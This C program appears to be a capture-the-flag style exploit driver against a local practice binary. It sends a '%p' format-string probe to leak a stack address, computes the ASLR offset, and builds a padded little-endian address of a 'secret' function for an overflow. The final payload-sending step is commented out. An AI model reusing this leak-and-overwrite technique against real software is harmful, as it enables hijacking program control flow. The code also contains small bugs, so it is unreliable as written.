#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <stdint.h>
#include <math.h>

int main () {
	int leakMeStringAddress   = 0xffffd650;
	int secretFunctionAddress = 0x5655642e;
	char exploit[128];
	char padding[128] = "AAAABBBBCCCCDDDDEEEEFFFF";
	int fd[2];
	pid_t pid;
	pipe(fd);
	pid = fork();
	if (pid == 0) {
		close(fd[1]);
		dup2(fd[0],0);
		execv("./testc", NULL);
	}
        
	char input[128] = "%p ";
        write(fd[1],input,strlen(input));
        
	sleep(2);
	
	//char input1[128] = "q";
        //write(fd[1],input1,strlen(input1));	

	char readData[64];
	
	
	FILE *f = fopen("feedback.txt", "a+");
	
	if (NULL == f) {
		printf("[*] Cannot find leak.txt\n");
	} else {
		printf("[*] Found leak.txt!\n");
		char readData[64];
		while (fgets(readData, 64, f) != NULL) {
			printf("[*] leak.txt contains: %s\n", readData);
			uint32_t addr;
			sscanf(readData, "%x", &addr);
			printf("[*] Leaked address (from readData) is %x\n",addr);
		
			printf("[*] Base address of leakme is %x\n", leakMeStringAddress);
			printf("[*] Base address of secret is %x\n", secretFunctionAddress);

			uint32_t offset_from_leak = addr - leakMeStringAddress;
 			printf("[*] Leakme offset in hexadecimals is %x\n", offset_from_leak);
 			printf("[*] Leakme offset in decimals is %d\n", offset_from_leak);
 			
 			uint32_t secret_with_offset = secretFunctionAddress + offset_from_leak;
 			printf("[*] Secret Address with offset is %x\n", secret_with_offset);
			
			char arr[32];
			uint32_t swapped;
			swapped = ((secret_with_offset << 8) & 0xFF00FF00 ) | ((secret_with_offset >> 8) & 0xFF00FF ); // change here
			swapped = (swapped << 16) | (swapped >> 16);
			
			printf("[*] Secret address in little endian format (make sure to prepend with 0s): %x\n", swapped);
			int rc = sprintf(arr, "%d", swapped);
			/*
			for (int i = rc; i > 2; i-=2) {
				printf("%c%c %d\n",readData[i-1],readData[i],i);
			}
			*/					
			const char hexstring[8], *pos = hexstring;
			sprintf(hexstring, "0%x", swapped); // add a 0 if odd number
			
			unsigned char val[4];
			for (size_t count = 0; count < sizeof val/sizeof *val; count++) {
				sscanf(pos, "%2hhx", &val[count]);
				pos += 2;
			}
			/*
			printf("\n0x ");	
			for (size_t count = 0; count < sizeof val/sizeof *val; count++) {
				printf("%02x ", val[count]);
			}
			printf("\n");
			*/	
			
			/*
			sprintf(exploit, "%s%s", padding, &val);
			printf("[*] Generating payload... Hope it works...\n");		
			close(fd[0]);
			write(fd[1],exploit,1024);			
			*/
			/*
			FILE *fo = fopen("/tmp/output.txt", "wb");
			fwrite(exploit, sizeof(exploit), 1, fo);
			fclose(fo);
			*/
		}
	}
	
	fclose(f);
	
        char input1[128] = "q";
        write(fd[1],input1,strlen(input1));
	
	close(fd[0]);
	
	return 0;
}
